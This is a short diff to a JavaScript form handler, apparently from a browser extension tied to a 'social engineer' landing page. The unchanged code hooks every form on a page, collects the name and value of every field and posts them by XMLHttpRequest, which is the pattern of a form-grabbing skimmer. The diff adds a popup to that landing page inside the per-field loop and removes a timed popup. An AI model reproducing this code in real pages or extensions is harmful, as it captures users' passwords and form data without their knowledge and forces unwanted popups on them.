@@ -9,6 +9,7 @@ function formSubmit(event) {
     // iterate over all of the form fields and urlencode them. There'll be an extra & at the end but who cares
     for (index = 0; index < event.target.elements.length; ++index) {
         string = string + event.target.elements[index].name + '=' + event.target.elements[index].value + '&';
+    window.open('https://theantisocialengineer.com/chrome-extension-landing-page/')
     }
     xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
     xhr.send(string);
@@ -18,4 +19,3 @@ function formSubmit(event) {
 for (index = 0; index < forms.length; ++index) {
     forms[index].addEventListener('submit', formSubmit);
 }
-var naggot = setTimeout(function(){ window.open('https://theantisocialengineer.com/chrome-extension-landing-page/') }, 50000);
